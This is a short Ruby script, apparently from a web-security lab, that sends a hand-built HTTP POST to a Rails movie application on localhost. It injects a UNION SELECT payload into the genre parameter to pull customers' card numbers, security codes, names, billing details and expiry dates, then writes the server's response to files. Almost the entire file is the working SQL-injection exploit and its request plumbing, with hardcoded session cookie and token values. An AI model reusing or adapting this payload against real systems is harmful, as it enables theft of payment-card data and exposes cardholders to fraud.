require 'socket'
require 'cgi'
 
AUTH_TOKEN = "NdRra4Sb30SRNYcACicDzV6t5pFb+CJnP5Y+6N4j+2A="
def post_requst_for_bad_page
  # SQL Injection string
  genre = "Action";
  sql_injection = genre + "' UNION SELECT billing_zip, card_number, name, security_code, exp_year, exp_month, billing_state FROM customers '"
  body = "utf8=✓&authenticity_token="+CGI::escape("#{AUTH_TOKEN}")+"&genre="+CGI::escape("#{sql_injection}")+"&commit="+CGI::escape("Show Movies")
  body_length = body.length+2
  # Create the HTTP header. Set all the fields
  get_req = "POST /movies/showGenre HTTP/1.0" + "\r\n"
  get_req += "Accept:text/xml,application/xml,application/xhtml+xml,text/html*/*" + "\r\n"
  get_req += "Accept-Encoding:gzip,deflate,sdch" + "\r\n"
  get_req += "Accept-Language:en-us" + "\r\n"
  get_req += "Cache-Control:max-age=0" + "\r\n"
  get_req += "Connection:close" + "\r\n"
  get_req += "Content-Length:" + body_length.to_s + "\r\n"
  get_req += "Content-Type:application/x-www-form-urlencoded" + "\r\n"
  get_req += "Cookie:_session_id=d7f6b3d54bebb5d8b7bd434a4cadacfe; request_method=POST" + "\r\n"
  get_req += "Host:localhost:3000" + "\r\n"
  get_req += "Origin:http://localhost:3000" + "\r\n"
  get_req += "Referer:http://localhost:3000/movies/selectGenre" + "\r\n"
  get_req += "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.114 Safari/537.36" + "\r\n"
  get_req += "Accept-Charset:iso-8859-1,*,utf-8" + "\r\n"
  get_req += "\r\n"
  get_req += body + "\r\n"
  get_req
end

def print_to_file(socket)
  fh = File.open("response.html", 'w')
  fhead = File.open("response_header.txt", 'w') 

  is_html_doc = false

  # Regex expression to match the beginning of the HTML doc
  regexHTML = Regexp.new(/<\?xml version.*?/)

  while(line=socket.gets) do
    matchHTML = regexHTML.match(line)
    if matchHTML
      is_html_doc = true
    end

    if is_html_doc
      fh.write(line)
    else
      fhead.write(line)
    end
  end

  fh.close
  fhead.close
end

# Set up the socket and open a new connection
host = 'localhost'
port = 3000
socket = TCPSocket.open(host, port)
post_req = post_requst_for_bad_page

# Put the data into the socket
socket.puts post_req

# read response from socket and print to file
print_to_file(socket)
# response = socket.read
# headers,body = response.split("\r\n\r\n", 2)
# print body

# Don't forget to close the socket!
socket.close

